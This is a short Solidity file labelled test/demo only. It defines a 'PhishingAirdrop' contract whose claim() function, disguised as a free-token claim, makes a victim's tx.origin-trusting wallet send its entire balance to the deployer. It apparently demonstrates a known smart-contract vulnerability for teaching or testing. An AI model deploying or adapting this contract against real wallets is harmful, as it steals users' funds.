// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IWallet {
    function pay(address payable to, uint256 amount) external;
}

/// @title PhishingAirdrop — test/demo only
/// @notice Looks like a harmless "claim your free tokens" contract. When the wallet owner calls
///         claim(), it quietly asks the owner's wallet to send everything to the attacker.
contract PhishingAirdrop {
    IWallet public immutable target;
    address payable public immutable attacker;

    constructor(address target_) {
        target = IWallet(target_);
        attacker = payable(msg.sender);
    }

    function claim() external {
        // tx.origin is the victim here, msg.sender (as seen by the wallet) is THIS contract.
        target.pay(attacker, address(target).balance);
    }
}
